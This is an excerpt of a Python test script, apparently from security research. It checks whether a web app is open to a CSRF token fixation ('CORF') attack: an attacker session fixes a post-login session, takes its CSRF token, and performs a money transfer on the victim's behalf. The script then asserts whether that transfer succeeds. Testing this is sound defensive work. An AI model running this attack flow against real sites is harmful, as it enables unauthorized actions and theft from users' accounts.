...
from common import CORF_POST_LOGIN_MSG
...
with requests.Session() as s:
    print("[+] Step2: Testing CORF Token Fixation Attack (post-login) without setting post-session")
    ...
    ### ATTACKER fails to perform the CSRF protected action on behalf of NAME1 WITHOUT post-fixating the secret
    ...
    print("    - CORF attack failed without setting post-session")
...
with requests.Session() as s:
    print("[+] Step3: Testing CORF Token Fixation Attack (post-login)")
    ...
    ### Attacker sets Post-Session
    s.get(ATTACKER, verify = PRIVATE_KEY)
    r_attacker = s.get(ATTACKER + 'set_post_session')
    ### extract csrf_token to use later
    csrf_token_attacker = get_csrf_token(r_attacker.text)

    ### ATTACKER succeeds in performing CSRF protected action on behalf of USER2
    r_attacker = transfer(s, NAME2, AMMOUNT2, csrf_token_attacker)
    if EXPECTED_RESULT == 'VULNERABLE':
        assert CORF_SUCCESS_MSG % (AMMOUNT2, NAME1, NAME2) in r_attacker.text, "NOT " + CORF_POST_LOGIN_MSG
        current_balance -= AMMOUNT2
        r = s.get(TARGET)

        assert LOGGEDIN_MESSAGE % NAME1 in r.text
        assert str(current_balance) in r.text
        print(f"    - {CORF_POST_LOGIN_MSG}\n")
    else:
        assert CORF_FAIL_WITH_WRONG_TOKEN in r_attacker.text, CORF_POST_LOGIN_MSG
        r = s.get(TARGET)

        assert LOGGEDIN_MESSAGE % NAME1 in r.text
        assert str(current_balance) in r.text
        print(f"    - NOT {CORF_POST_LOGIN_MSG}\n")
